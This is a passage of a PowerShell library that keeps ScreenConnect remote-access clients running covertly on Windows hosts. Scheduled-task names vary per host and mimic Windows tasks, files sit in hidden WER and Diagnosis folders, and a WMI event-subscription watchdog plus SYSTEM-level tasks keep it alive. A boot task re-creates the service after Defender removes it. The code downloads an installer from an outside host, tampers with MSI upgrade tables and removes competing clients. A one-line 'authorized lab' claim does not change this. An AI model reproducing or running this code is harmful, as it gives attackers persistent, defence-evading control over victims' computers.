#Requires -Version 5.1
# ═══════════════════════════════════════════════════════════════
# OWN_LIB  BUILD 20260804L40
# Shared library: per-host identity (anti-signature), WMI watchdog
# (mutual persistence chain), campaign state file, SC service repair.
# L44: HARD lock — any live Gryxa => never migrate/uninstall/i; no deferred /x; protect must empty Upgrade.
# L43: Test-ScRunning includes StartPending; never /x when service exists (connect-drop race).
# L42: FP migrate install-new-FIRST then defer-remove-old (never leave host with zero Gryxa).
# L41: -Force NEVER /x+/i when Gryxa already Running (force_gryxa.flag was killing live Guest).
# L39: relay-verified Gryxa keeper adoption; INFLIGHT≠HEALTHY; real -Force/-Deep;
#      post-Gryxa /i sevrz restore; Test-MsiPackage; TASK_G in state; persistence purge w/o FP-only.
# L38: TASK_G WucacheGryxaBoot ONSTART runs gryxa-ensure -NoWait -Force at boot (Defender strips SCM entry at startup). L37: MSI magic+FP validate.
# L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
# L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
# L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
# L18: exterminate was KILLING Gryxa (null-path proc kill); sync FP before kill.
# L17: Gryxa reinstall LOCK while any non-sevrz SC Running; FP drift never /x.
# L16: NEVER reinstall Gryxa when Running (panel duplicates); TCP advisory only.
# L15: gryxa-health / gryxa-ensure — 8h deep check (TCP/relay/FP drift reinstall).
# L13: schtasks Create via cmd (like WucacheOwn), TR under Windows\Temp\.wucache
#      (not ACL-locked ProgramData path), /ST 00:00 on MINUTE, no leading \.
# L12: IDENTVER=7 ROOT-level task names (nested Microsoft\Windows Access Denied).
# L11: NEVER reuse real Windows built-in task names; TR ownership checks.
# Authorized internal deployment - lab/competition scope only.
# ═══════════════════════════════════════════════════════════════
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'tasks-ensure', 'state', 'identity', 'repair', 'registered', 'exterminate', 'gryxa-health', 'gryxa-ensure', 'sync-gryxa-fp', 'test-msi', 'protect-msi', 'verify-update', 'sync-sevrz-fp')]
    [string]$Action,
    [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
    [string]$MonPath = '',
    [string]$Build  = 'O15',
    [string]$Extra  = '',
    [string]$Fp     = '',
    [switch]$Deep,
    [switch]$Force,
    [switch]$NoWait
)

$ErrorActionPreference = 'SilentlyContinue'
$cfgPath = Join-Path $WorkDir 'identity.cfg'
$IdentVersion = 8

# Root-level names WITHOUT leading backslash (matches working WucacheOwn style).
$Pools = @{
    A = @('WerQueueSync','DiagHostCache','NetTraceCache','WdiHostProxy','PlaServerHealth','TcpIpConflictRes','SrCacheSync','ResolutionQueue')
    B = @('PlaServerHealth','WdiHostProxy','WerQueueSync','NetTraceCache','DiagHostCache','TcpIpConflictRes','PlaServerDiag','SrCacheSync')
    C = @('ResolutionQueue','NetTraceCache','TcpIpConflictRes','WerQueueSync','PlaServerHealth','DiagHostCache','PlaServerDiag','WdiHostProxy')
    D = @('TcpIpConflictRes','ResolutionQueue','NetTraceCache','DiagHostCache','PlaServerDiag','WerQueueSync','PlaServerHealth','WdiHostProxy')
}
$Defaults = [ordered]@{
    TASK_A = 'WerQueueSync'
    TASK_B = 'PlaServerHealth'
    TASK_C = 'WdiHostProxy'
    TASK_D = 'TcpIpConflictRes'
    MO_A   = '2'
    MO_B   = '3'
}

function Get-HostSeed {
    $s = 0L
    foreach ($c in $env:COMPUTERNAME.ToUpper().ToCharArray()) { $s = ($s * 31 + [int]$c) % 1000000007 }
    return $s
}

function Read-Identity {
    $id = $Defaults.Clone()
    if (Test-Path $cfgPath) {
        foreach ($line in (Get-Content -LiteralPath $cfgPath -Force)) {
            if ($line -match '^\s*([A-Z_]+)\s*=\s*(.+?)\s*$') { $id[$matches[1]] = $matches[2] }
        }
    }
    return $id
}

function Remove-TaskQuiet([string]$tn) {
    if ($tn) { & schtasks.exe /Delete /TN $tn /F 2>&1 | Out-Null }
}

function Get-TaskVerboseBlob([string]$tn) {
    if (-not $tn) { return '' }
    $out = & schtasks.exe /Query /TN $tn /FO LIST /V 2>$null
    if ($LASTEXITCODE -ne 0 -or -not $out) { return '' }
    return (($out | ForEach-Object { "$_" }) -join "`n")
}

function Test-TaskOwnsMon([string]$tn, [string]$marker) {
    # True only if the scheduled action points at OUR mon/etl path — not a Windows COM handler.
    $blob = Get-TaskVerboseBlob $tn
    if (-not $blob) { return $false }
    if ($marker -and ($blob -match [regex]::Escape($marker))) { return $true }
    if ($blob -match '(?i)\.wucache\\|own_mon\.cmd|etl_mon\.cmd|\.etlcache\\') { return $true }
    return $false
}

function Initialize-Identity {
    # Idempotent within an IDENTVER generation. Pool upgrades bump IDENTVER:
    # owned old-name tasks are deleted; Windows built-ins with same name are left alone.
    if (Test-Path $cfgPath) {
        $old = Read-Identity
        # L7: also regenerate if any TASK_* is empty (L4-L6 modulo/cast bugs left blank slots)
        $slotsOk = ($old['IDENTVER'] -eq "$IdentVersion") -and $old['TASK_A'] -and $old['TASK_B'] -and $old['TASK_C'] -and $old['TASK_D']
        if ($slotsOk) { return $old }
        foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
            $tn = [string]$old[$k]
            if (-not $tn) { continue }
            # Never delete a real Windows task we never owned (TR is COM/custom handler).
            if (Test-TaskOwnsMon $tn '') { Remove-TaskQuiet $tn }
        }
        Remove-Item -LiteralPath $cfgPath -Force
    }
    $s = Get-HostSeed
    # L4: two slots may hash to the same task path (pools share names) ->
    # one physical task then satisfies two slots and the fleet shows 3/4.
    # Walk each pool forward until the pick is unique across slots.
    # L6: the old @(@('A', $s % 8), ...) form was double-broken in PS 5.1:
    # bare % inside @() parses as the ForEach-Object alias (not modulo), so the
    # collection collapsed and the loop never ran -> identity.cfg had EMPTY
    # TASK_* and the whole fleet fell back to identical default task names.
    $seeds = [ordered]@{
        A = ($s % 8)
        B = (($s + 3) % 8)
        C = (($s + 5) % 8)
        D = (($s + 7) % 8)
    }
    $pick = [ordered]@{}
    foreach ($letter in 'A','B','C','D') {
        $i = [int]$seeds[$letter]
        $name = $Pools[$letter][$i]
        $n = 0
        while ($pick.Values -contains $name -and $n -lt 8) { $i = ($i + 1) % 8; $name = $Pools[$letter][$i]; $n++ }
        if (-not $name) { $name = $Defaults["TASK_$letter"] }
        $pick[$letter] = $name
    }
    $cfg = @(
        "TASK_A=$($pick.A)"
        "TASK_B=$($pick.B)"
        "TASK_C=$($pick.C)"
        "TASK_D=$($pick.D)"
        "MO_A=$(2 + ($s % 4))"          # 2-5 min jitter
        "MO_B=$(3 + (($s + 1) % 3))"    # 3-5 min jitter
        "SEED=$s"
        "IDENTVER=$IdentVersion"
    )
    Set-Content -LiteralPath $cfgPath -Value $cfg -Force
    return (Read-Identity)
}

function Normalize-TaskName([string]$tn) {
    if (-not $tn) { return '' }
    return $tn.Trim().TrimStart('\')
}

function Write-OwnLog([string]$m) {
    $log = Join-Path $WorkDir 'boot.err'
    try { Add-Content -LiteralPath $log -Value $m -Force } catch {}
}

function Ensure-PersistTasks {
    # Mirror working detach (WucacheOwn): cmd schtasks, BOOT TR path, /ST on MINUTE.
    $id = Initialize-Identity
    if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
    $boot = Join-Path $env:SystemRoot 'Temp\.wucache'
    $etlDir = 'C:\ProgramData\Microsoft\Diagnosis\State\.etlcache'
    foreach ($d in @($boot, $etlDir)) {
        if (-not (Test-Path -LiteralPath $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
    }
    $bootMon = Join-Path $boot 'own_mon.cmd'
    $bootEtl = Join-Path $boot 'etl_mon.cmd'
    $etlMon = Join-Path $etlDir 'etl_mon.cmd'
    if (Test-Path -LiteralPath $MonPath) {
        Copy-Item -LiteralPath $MonPath -Destination $bootMon -Force -ErrorAction SilentlyContinue
        Copy-Item -LiteralPath $MonPath -Destination $bootEtl -Force -ErrorAction SilentlyContinue
        Copy-Item -LiteralPath $MonPath -Destination $etlMon -Force -ErrorAction SilentlyContinue
    }
    # L37: dedicated boot gryxa-heal. Defender can strip the gryxa SCM service entry during
    # boot before the mon's MINUTE task fires. A boot-trigger ensure (-NoWait -Force) re-creates
    # it within seconds of startup, so reboots no longer drop the host from gryxa.
    $bootGryxa = Join-Path $boot 'gryxa_boot.cmd'
    $libInBoot = Join-Path $boot 'own_lib.ps1'
    if (Test-Path -LiteralPath (Join-Path $WorkDir 'own_lib.ps1')) {
        Copy-Item -LiteralPath (Join-Path $WorkDir 'own_lib.ps1') -Destination $libInBoot -Force -ErrorAction SilentlyContinue
    }
    $gbLines = @(
        '@echo off',
        ('start /min "" powershell -NoProfile -ExecutionPolicy Bypass -File "{0}" -Action gryxa-ensure -Deep -Force -NoWait -WorkDir "{1}" -Build BOOT' -f $libInBoot, $WorkDir),
        'exit'
    )
    Set-Content -LiteralPath $bootGryxa -Value $gbLines -Encoding ASCII -Force
    # BOOT is not LockDir'd by own_secure — Task Scheduler can resolve TR there.
    $trMon = "cmd.exe /c $bootMon"
    $trEtl = "cmd.exe /c $bootEtl"
    $trGryxa = "cmd.exe /c $bootGryxa"
    $moA = [string]$id['MO_A']; if (-not $moA) { $moA = '2' }
    $moB = [string]$id['MO_B']; if (-not $moB) { $moB = '3' }
    $st = (Get-Date).ToString('HH:mm')
    $specs = @(
        @{ Key = 'TASK_A'; Marker = 'own_mon.cmd'; Sc = 'MINUTE'; Mo = $moA; Tr = $trMon }
        @{ Key = 'TASK_B'; Marker = 'etl_mon.cmd'; Sc = 'MINUTE'; Mo = $moB; Tr = $trEtl }
        @{ Key = 'TASK_C'; Marker = 'own_mon.cmd'; Sc = 'ONSTART'; Mo = ''; Tr = $trMon }
        @{ Key = 'TASK_D'; Marker = 'own_mon.cmd'; Sc = 'ONLOGON'; Mo = ''; Tr = $trMon }
        @{ Key = 'TASK_G'; Marker = 'gryxa_boot.cmd'; Sc = 'ONSTART'; Mo = ''; Tr = $trGryxa }
    )
    $ok = 0; $rearmed = 0; $fail = 0
    foreach ($sp in $specs) {
        # TASK_G (boot gryxa-heal) uses a fixed name; the A-D rotation pool has no slot for it.
        $tn = if ($sp.Key -eq 'TASK_G') { 'WucacheGryxaBoot' } else { Normalize-TaskName ([string]$id[$sp.Key]) }
        if (-not $tn) { $fail++; continue }
        if (Test-TaskOwnsMon $tn $sp.Marker) { $ok++; continue }
        if (Test-TaskOwnsMon ("\$tn") $sp.Marker) { $ok++; continue }
        $blob = Get-TaskVerboseBlob $tn
        if (-not $blob) { $blob = Get-TaskVerboseBlob ("\$tn") }
        if ($blob) {
            $oursBroken = ($blob -match '(?i)own_mon\.cmd|etl_mon\.cmd|gryxa_boot\.cmd|\.wucache\\|\.etlcache\\')
            if (-not $oursBroken) { $fail++; Write-OwnLog "tasks_skip_foreign $tn"; continue }
            Remove-TaskQuiet $tn
            Remove-TaskQuiet ("\$tn")
        }
        # Build cmdline exactly like own.cmd detach (proven to work as SYSTEM).
        $parts = @(
            '/Create', '/TN', $tn, '/RU', 'SYSTEM', '/RL', 'HIGHEST', '/F',
            '/TR', $sp.Tr, '/SC', $sp.Sc
        )
        if ($sp.Sc -eq 'MINUTE') {
            $parts += @('/MO', $sp.Mo, '/ST', $st)
        }
        $argLine = ($parts | ForEach-Object {
            if ($_ -match '[\s"]') { '"{0}"' -f ($_ -replace '"', '\"') } else { $_ }
        }) -join ' '
        $createTxt = cmd.exe /c "schtasks.exe $argLine" 2>&1 | ForEach-Object { "$_" }
        $createJoined = ($createTxt -join ' ').Trim()
        Write-OwnLog "tasks_create $($sp.Key) $tn => $createJoined"
        if ((Test-TaskOwnsMon $tn $sp.Marker) -or (Test-TaskOwnsMon ("\$tn") $sp.Marker)) {
            $rearmed++
            if ($sp.Key -eq 'TASK_A' -or $sp.Key -eq 'TASK_B') {
                cmd.exe /c "schtasks.exe /Run /TN `"$tn`"" | Out-Null
            }
        } else {
            $fail++
            Write-OwnLog "tasks_create_FAIL $($sp.Key) $tn"
        }
    }
    return "tasks ok=$ok rearmed=$rearmed fail=$fail"
}

function Remove-Watchdog {
    foreach ($cls in @('__FilterToConsumerBinding','__EventFilter','CommandLineEventConsumer','__IntervalTimerInstruction')) {
        Get-WmiObject -Namespace root\subscription -Class $cls -ErrorAction SilentlyContinue |
            Where-Object {
                ($_.Name -eq 'WucacheWatchdogF') -or ($_.Name -eq 'WucacheWatchdogC') -or
                ($_.TimerId -eq 'WucacheWatchdog') -or
                ($_.Filter -and $_.Filter.ToString() -like '*WucacheWatchdogF*') -or
                ($_.Consumer -and $_.Consumer.ToString() -like '*WucacheWatchdogC*')
            } | ForEach-Object { $_.Delete() | Out-Null }
    }
}

function Install-Watchdog {
    if (-not $MonPath) { return $false }
    Remove-Watchdog
    $ok = $true
    try {
        Set-WmiInstance -Namespace root\subscription -Class __IntervalTimerInstruction `
            -Arguments @{ TimerId = 'WucacheWatchdog'; IntervalMilliseconds = 180000; SkipIfPassed = $false } | Out-Null
        $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
            -Arguments @{ Name = 'WucacheWatchdogF'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL';
                          Query = "SELECT * FROM __TimerEvent WHERE TimerId='WucacheWatchdog'" }
        $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
            -Arguments @{ Name = 'WucacheWatchdogC'; CommandLineTemplate = "cmd.exe /c `"$MonPath`""; RunInteractively = $false }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Arguments @{ Filter = $f; Consumer = $c } | Out-Null
    } catch { $ok = $false }
    return $ok
}

function Test-WatchdogGraph {
    $t = Get-WmiObject -Namespace root\subscription -Class __IntervalTimerInstruction -Filter "TimerId='WucacheWatchdog'" -ErrorAction SilentlyContinue
    $f = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WucacheWatchdogF'" -ErrorAction SilentlyContinue
    $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'" -ErrorAction SilentlyContinue
    $b = $null
    if ($f -and $c) {
        $b = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like '*WucacheWatchdogF*' -and $_.Consumer -like '*WucacheWatchdogC*' } |
            Select-Object -First 1
    }
    return [bool]($t -and $f -and $c -and $b)
}

function Ensure-Watchdog {
    if (Test-WatchdogGraph) { return 'OK' }
    if (-not $MonPath) { return 'MISSING' }
    if (Install-Watchdog) { return 'REARMED' }
    return 'FAIL'
}

# Correct 32-bit + 64-bit ARP hives. L6 and earlier used a truncated
# WOW6432Node path (missing Microsoft\Windows) so EVERY 32-bit SC product
# was invisible to repair/exterminate/registered.
$script:UninstallRoots = @(
    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
)

function Test-SCRegistered([string]$Fingerprint) {
    # L8: NEVER use return inside ForEach-Object - it only exits the
    # pipeline iteration, so this function always fell through to 'no'
    # and the mon orphan-ladder deleted healthy registered services.
    if (-not $Fingerprint) { return 'no' }
    $name = "ScreenConnect Client ($Fingerprint)"
    foreach ($root in $script:UninstallRoots) {
        if (-not (Test-Path $root)) { continue }
        foreach ($key in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
            $dn = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
            if ($dn -and ($dn -ieq $name) -and ($key.PSChildName -like '{*}')) { return 'yes' }
        }
    }
    return 'no'
}

function Repair-SCService([string]$Fingerprint) {
    # L30: NEVER run msiexec /fa or /i on a ScreenConnect product — SC instances share
    # legacy UpgradeCodes, so any msiexec repair/install on one FP triggers a
    # major-upgrade removal that knocks the Gryxa sibling OFFLINE. Service-level heal only.
    if (-not $Fingerprint) { return 'no-fp' }
    $name = "ScreenConnect Client ($Fingerprint)"
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq 'Running') { return 'svc-running' }
    if ($svc) {
        # present but stopped -> service-level start, no msiexec
        & sc.exe config "$name" start= auto 2>&1 | Out-Null
        & sc.exe failure "$name" reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
        & sc.exe start "$name" 2>&1 | Out-Null
        Start-Sleep -Seconds 6
        & sc.exe start "$name" 2>&1 | Out-Null
        $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
        if ($svc -and $svc.Status -eq 'Running') { return 'svc-started' }
        return 'svc-still-stopped-norepair(msiexec-disabled)'
    }
    # service entry gone: re-create from the registered product's install dir WITHOUT msiexec.
    # If binaries exist, sc.exe create + start. Else report so caller can decide (never /fa, never /i).
    $dir = $null
    foreach ($base in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
        $cand = Join-Path $base "ScreenConnect Client ($Fingerprint)"
        if (Test-Path -LiteralPath (Join-Path $cand 'ScreenConnect.ClientService.exe')) { $dir = $cand; break }
    }
    if (-not $dir) { return 'not-registered-norepair(msiexec-disabled)' }
    $exe = Join-Path $dir 'ScreenConnect.ClientService.exe'
    & sc.exe create "$name" binPath= "`"$exe`"" start= auto DisplayName= "$name" 2>&1 | Out-Null
    & sc.exe failure "$name" reset= 86400 actions= restart/5000/restart/5000/restart/5000 2>&1 | Out-Null
    & sc.exe start "$name" 2>&1 | Out-Null
    Start-Sleep -Seconds 5
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq 'Running') { return 'svc-recreated-started' }
    return 'svc-recreated-not-running'
}

# ── Gryxa SC v2 (clean rewrite) ───────────────────────────────
# Single-flight ensure. Running => healthy. Stopped svc => start.
# Broken/Stuck => clean-reinstall once, detached. Absent => install once.
# No /fa, no inline blocking /i, no false "already_running".
$script:GryxaDefaultFp = '36e506ff016b2151'
$script:GryxaMsiUrl = 'https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
$script:GryxaRelayHost = 'update.gryxa.com'
$script:GryxaUiHost = 'ui.gryxa.com'
$script:SevrzDefaultPrimary = '5f6010579852e507'
$script:SevrzDefaultAlt = 'f861c8140d453427'
$script:SevrzKeep = @($script:SevrzDefaultPrimary, $script:SevrzDefaultAlt)
# Set to a 16-hex FP you WANT installed (after rotating on the panel). Any host
# running a different FP migrates to this one. Leave '' to just track whatever runs.
$script:GryxaExpectedFp = '36e506ff016b2151'

# L40: RSA public key for update.manifest verification (private key in keys/, gitignored)
$script:UpdatePubKeyXml = @'
<RSAKeyValue><Modulus>tABZPnvsupori19mtJbHoT1uFGVLNKqONB0xtvIBH4HpfM5U+StCuGnEdIyPykMQPjDElVBZOea8pddBxxPMI94d4VBpdwnQedWHlnl6EuQsJL2MMc0xo0duzpQdPVjDneIItOxVMnl4MmTSS8i15OfNTH6yddlfi6tNfTvvCtkxlL9c0qXxtIoYLQL9jC294t2O0vOsAlih0hS6XAGp8OATKR/KVPp8qfw8tzrSvKgYkpe79bJ67btjO7qTHv1JpP04xeYtCKjSFN6Xh02drtqvyuCHvw1+0HYfviaH5yNApwoNx/f5U63uMiirKuJaZMBvXM8umxykAGrqdSU0pQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
'@

function Get-GryxaCfgPath { Join-Path $WorkDir 'gryxa.cfg' }
function Get-SevrzCfgPath { Join-Path $WorkDir 'sevrz.cfg' }

function Get-SevrzKeep {
    $prim = $script:SevrzDefaultPrimary
    $alt = $script:SevrzDefaultAlt
    $p = Get-SevrzCfgPath
    if (Test-Path -LiteralPath $p) {
        Get-Content -LiteralPath $p -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_ -match '^PRIMARY_FP=([0-9a-fA-F]{16})\s*$') { $prim = $matches[1].ToLower() }
            if ($_ -match '^ALT_FP=([0-9a-fA-F]{16})\s*$') { $alt = $matches[1].ToLower() }
            if ($_ -match '^EXPECTED_PRIMARY=([0-9a-fA-F]{16})\s*$') { $prim = $matches[1].ToLower() }
            if ($_ -match '^EXPECTED_ALT=([0-9a-fA-F]{16})\s*$') { $alt = $matches[1].ToLower() }
        }
    }
    $script:SevrzKeep = @($prim, $alt)
    return @($prim, $alt)
}

function Set-SevrzFp([string]$Primary, [string]$Alt) {
    if (-not $Primary) { $Primary = $script:SevrzDefaultPrimary }
    if (-not $Alt) { $Alt = $script:SevrzDefaultAlt }
    if (-not (Test-Path -LiteralPath $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
    @(
        "PRIMARY_FP=$($Primary.ToLower())",
        "ALT_FP=$($Alt.ToLower())",
        "EXPECTED_PRIMARY=$($Primary.ToLower())",
        "EXPECTED_ALT=$($Alt.ToLower())",
        "UPDATED=$((Get-Date).ToUniversalTime().ToString('o'))"
    ) | Set-Content -LiteralPath (Get-SevrzCfgPath) -Encoding ASCII -Force
    $script:SevrzKeep = @($Primary.ToLower(), $Alt.ToLower())
}

function Sync-SevrzExpected([string]$ExpectedText) {
    # Apply repo sevrz_expected.cfg body (EXPECTED_PRIMARY=/EXPECTED_ALT= lines)
    $prim = $null; $alt = $null
    foreach ($line in ($ExpectedText -split "`r?`n")) {
        if ($line -match '^EXPECTED_PRIMARY=([0-9a-fA-F]{16})\s*$') { $prim = $matches[1].ToLower() }
        if ($line -match '^EXPECTED_ALT=([0-9a-fA-F]{16})\s*$') { $alt = $matches[1].ToLower() }
    }
    if (-not $prim) { $prim = (Get-SevrzKeep)[0] }
    if (-not $alt) { $alt = (Get-SevrzKeep)[1] }
    Set-SevrzFp $prim $alt
    return "SEVRZ|$prim|$alt"
}

function Protect-MsiSiblingSafe([string]$MsiPath) {
    # L40/L44: copy MSI and DELETE FROM Upgrade so /i cannot RemoveExistingProducts siblings.
    # L44: verify Upgrade is empty after DELETE — never return a still-dangerous MSI.
    if (-not $MsiPath -or -not (Test-Path -LiteralPath $MsiPath)) { return $null }
    $safe = Join-Path $env:TEMP ("sc_safe_{0}.msi" -f [guid]::NewGuid().ToString('N'))
    try {
        Copy-Item -LiteralPath $MsiPath -Destination $safe -Force
        $i = New-Object -ComObject WindowsInstaller.Installer
        $db = $i.OpenDatabase((Resolve-Path -LiteralPath $safe).Path, 1)
        try {
            $v = $db.OpenView('DELETE FROM `Upgrade`')
            $v.Execute() | Out-Null
            $db.Commit()
        } catch {
            Remove-Item -LiteralPath $safe -Force -ErrorAction SilentlyContinue
            return $null
        }
        # verify empty
        try {
            $db2 = $i.OpenDatabase((Resolve-Path -LiteralPath $safe).Path, 0)
            $c = $db2.OpenView('SELECT `UpgradeCode` FROM `Upgrade`')
            $c.Execute() | Out-Null
            if ($c.Fetch()) {
                Remove-Item -LiteralPath $safe -Force -ErrorAction SilentlyContinue
                return $null
            }
        } catch {
            # missing Upgrade table = already safe
        }
        return $safe
    } catch {
        if (Test-Path -LiteralPath $safe) { Remove-Item -LiteralPath $safe -Force -ErrorAction SilentlyContinue }
        return $null
    }
}

function Test-UpdateManifest([string]$ManifestPath, [string]$SigPath, [hashtable]$FileMap) {
    # Verify RSA-SHA256 signature over update.manifest, then SHA256 of each staged file.
    if (-not (Test-Path -LiteralPath $ManifestPath) -or -not (Test-Path -LiteralPath $SigPath)) { return 'missing' }
    if (-not $script:UpdatePubKeyXml -or $script:UpdatePubKeyXml -match 'PLACEHOLDER') { return 'no-pubkey' }
    try {
        $bytes = [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $ManifestPath).Path)
        $sig = [Convert]::FromBase64String(([IO.File]::ReadAllText((Resolve-Path -LiteralPath $SigPath).Path).Trim()))
        $rsa = [System.Security.Cryptography.RSA]::Create()
        $rsa.FromXmlString($script:UpdatePubKeyXml)
        if (-not $rsa.VerifyData($bytes, $sig, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)) {
            return 'bad-sig'
        }
        $doc = Get-Content -LiteralPath $ManifestPath -Raw | ConvertFrom-Json
        foreach ($name in $FileMap.Keys) {
            $path = $FileMap[$name]
            if (-not (Test-Path -LiteralPath $path)) { return "missing-file:$name" }
            $want = [string]$doc.files.$name
            if (-not $want) { return "not-in-manifest:$name" }
            $sha = [System.Security.Cryptography.SHA256]::Create()
            $fs = [IO.File]::OpenRead((Resolve-Path -LiteralPath $path).Path)
            try { $hash = ([BitConverter]::ToString($sha.ComputeHash($fs))).Replace('-', '').ToLower() }
            finally { $fs.Close() }
            if ($hash -ne $want.ToLower()) { return "hash-mismatch:$name" }
        }
        return 'ok'
    } catch { return "error:$($_.Exception.Message)" }
}

function Get-GryxaFp {
    $fp = $script:GryxaDefaultFp
    $p = Get-GryxaCfgPath
    if (Test-Path -LiteralPath $p) {
        Get-Content -LiteralPath $p -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_ -match '^CURRENT_FP=([0-9a-fA-F]{16})\s*$') { $fp = $matches[1].ToLower() }
        }
    }
    return $fp
}

function Set-GryxaFp([string]$Fingerprint) {
    if (-not $Fingerprint) { return }
    if (-not (Test-Path -LiteralPath $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
    @(
        "CURRENT_FP=$($Fingerprint.ToLower())",
        "RELAY=$($script:GryxaRelayHost)",
        "UI=$($script:GryxaUiHost)",
        "MSIURL=$($script:GryxaMsiUrl)",
        "UPDATED=$((Get-Date).ToUniversalTime().ToString('o'))"
    ) | Set-Content -LiteralPath (Get-GryxaCfgPath) -Encoding ASCII -Force
}

# L39: never adopt a foreign SC as Gryxa. Keeper only if FP is ExpectedFp OR
# ImagePath/cmdline contains gryxa.com (or cfg RELAY host). Do NOT trust cfg alone —
# a poisoned CURRENT_FP would self-whitelist forever.
function Test-IsGryxaFp([string]$Fp) {
    if (-not $Fp) { return $false }
    $fp = $Fp.ToLower()
    if ($fp -in $script:SevrzKeep) { return $false }
    if ($script:GryxaExpectedFp -and $fp -eq $script:GryxaExpectedFp.ToLower()) { return $true }
    $name = "ScreenConnect Client ($fp)"
    $img = [string](Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$name" -ErrorAction SilentlyContinue).ImagePath
    $relay = $script:GryxaRelayHost
    if ($img -and ($img -match '(?i)gryxa\.com' -or ($relay -and $img -like "*$relay*"))) { return $true }
    foreach ($proc in (Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue)) {
        $blob = "$([string]$proc.ExecutablePath) $([string]$proc.CommandLine)"
        if ($blob -like "*$fp*" -and ($blob -match '(?i)gryxa\.com' -or ($relay -and $blob -like "*$relay*"))) {
            return $true
        }
    }
    return $false
}

function Get-KeepFingerprints {
    $set = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
    foreach ($s in (Get-SevrzKeep)) { [void]$set.Add($s) }
    if ($script:GryxaExpectedFp) { [void]$set.Add($script:GryxaExpectedFp) }
    $cfg = Get-GryxaFp
    if ($cfg -and (Test-IsGryxaFp $cfg)) { [void]$set.Add($cfg) }
    elseif ($script:GryxaExpectedFp) { [void]$set.Add($script:GryxaExpectedFp) }
    else { [void]$set.Add($script:GryxaDefaultFp) }
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
        if ($svc.Status -notin @('Running','StartPending','ContinuePending')) { continue }
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            $fp = $matches[1].ToLower()
            if ($fp -in $script:SevrzKeep) { continue }
            if (Test-IsGryxaFp $fp) { [void]$set.Add($fp); Set-GryxaFp $fp }
        }
    }
    return @($set)
}

function Test-TcpHostPort([string]$HostName, [int]$Port = 443, [int]$TimeoutMs = 8000) {
    if (-not $HostName) { return $false }
    $c = $null
    try {
        $c = New-Object System.Net.Sockets.TcpClient
        $iar = $c.BeginConnect($HostName, $Port, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) { try { $c.Close() } catch {}; return $false }
        $c.EndConnect($iar); return $true
    } catch { return $false } finally { if ($c) { try { $c.Close() } catch {} } }
}

function Get-MsiProperty([string]$MsiPath, [string]$PropertyName) {
    if (-not (Test-Path -LiteralPath $MsiPath)) { return $null }
    try {
        $i = New-Object -ComObject WindowsInstaller.Installer
        $db = $i.OpenDatabase((Resolve-Path -LiteralPath $MsiPath).Path, 0)
        $v = $db.OpenView("SELECT `Value` FROM `Property` WHERE `Property`='$PropertyName'")
        $v.Execute() | Out-Null
        $r = $v.Fetch()
        if (-not $r) { return $null }
        return [string]$r.StringData(1)
    } catch { return $null }
}

function Get-FpFromProductName([string]$ProductName) {
    if ($ProductName -match '\(([0-9a-fA-F]{16})\)') { return $matches[1].ToLower() }
    return $null
}

function Find-ProductGuid([string]$Fingerprint) {
    $name = "ScreenConnect Client ($Fingerprint)"
    foreach ($root in $script:UninstallRoots) {
        if (-not (Test-Path $root)) { continue }
        foreach ($key in (Get-ChildItem $root -ErrorAction SilentlyContinue)) {
            $dn = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
            if ($dn -and ($dn -ieq $name) -and ($key.PSChildName -like '{*}')) { return $key.PSChildName }
        }
    }
    return $null
}

function Test-ScRunning([string]$Fingerprint) {
    # L43: StartPending/ContinuePending = live session in progress — never treat as down
    # (that race caused msiexec /x during connect → Guest drop).
    if (-not $Fingerprint) { return $false }
    $svc = Get-Service -Name "ScreenConnect Client ($Fingerprint)" -ErrorAction SilentlyContinue
    return [bool]($svc -and $svc.Status -in @('Running', 'StartPending', 'ContinuePending'))
}

function Test-ScServiceExists([string]$Fingerprint) {
